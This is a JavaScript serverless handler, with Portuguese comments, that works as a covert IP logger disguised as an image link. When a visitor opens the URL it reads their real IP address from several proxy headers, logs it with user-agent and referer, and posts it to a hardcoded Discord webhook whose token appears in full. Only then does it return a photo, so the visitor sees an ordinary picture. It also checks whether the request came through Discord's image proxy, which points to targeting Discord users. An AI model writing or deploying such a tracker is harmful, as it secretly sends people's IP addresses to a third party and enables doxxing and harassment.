import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // TENTA VÁRIAS FORMAS DE PEGAR IP REAL
  const forwarded = req.headers['x-forwarded-for'];
  const realIp = req.headers['x-real-ip'];
  const cfConnectingIp = req.headers['cf-connecting-ip']; // Cloudflare
  const connectionIp = req.connection?.remoteAddress;
  const socketIp = req.socket?.remoteAddress;
  
  // Decifra o IP REAL
  let ip = 'IP não detectado';
  
  if (forwarded) {
    // Pega o PRIMEIRO IP da lista (usuário real)
    const ips = forwarded.split(',').map(ip => ip.trim());
    ip = ips[0];
    console.log('📊 IPs no x-forwarded-for:', ips);
  } else if (cfConnectingIp) {
    ip = cfConnectingIp;
  } else if (realIp) {
    ip = realIp;
  } else if (connectionIp) {
    ip = connectionIp.replace('::ffff:', '');
  } else if (socketIp) {
    ip = socketIp.replace('::ffff:', '');
  }
  
  console.log('========== CAPTURA DE IP ==========');
  console.log('🌐 IP CAPTURADO:', ip);
  console.log('🕐 Data:', new Date().toLocaleString('pt-BR'));
  console.log('🔗 User-Agent:', req.headers['user-agent']?.substring(0, 80));
  console.log('📊 Referer:', req.headers['referer'] || 'Direto');
  console.log('==================================');
  
  // SE for IP do Discord (seus servidores)
  const discordIps = ['162.159.128.233', '162.159.129.233', '162.159.130.233', '162.159.133.233'];
  if (discordIps.includes(ip)) {
    console.log('⚠️ ATENÇÃO: Este é o IP do Discord (proxy)');
    console.log('👤 O usuário REAL não foi detectado porque Discord fez cache');
  }
  
  // Envia para Discord webhook
  const webhook = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
  
  try {
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🌐 **TENTATIVA DE ACESSO**\nIP Detectado: \`${ip}\`\n⚠️ Pode ser proxy do Discord\n🕐 ${new Date().toLocaleString('pt-BR')}`
      })
    });
  } catch (e) {}
  
  // Envia a foto
  try {
    const fotoPath = path.join(process.cwd(), 'public', 'minha-foto.png');
    const fotoBuffer = fs.readFileSync(fotoPath);
    
    res.setHeader('Content-Type', 'image/png');
    res.send(fotoBuffer);
    
  } catch (error) {
    console.log('❌ Erro na foto');
    res.status(404).send('Foto não encontrada');
  }
}
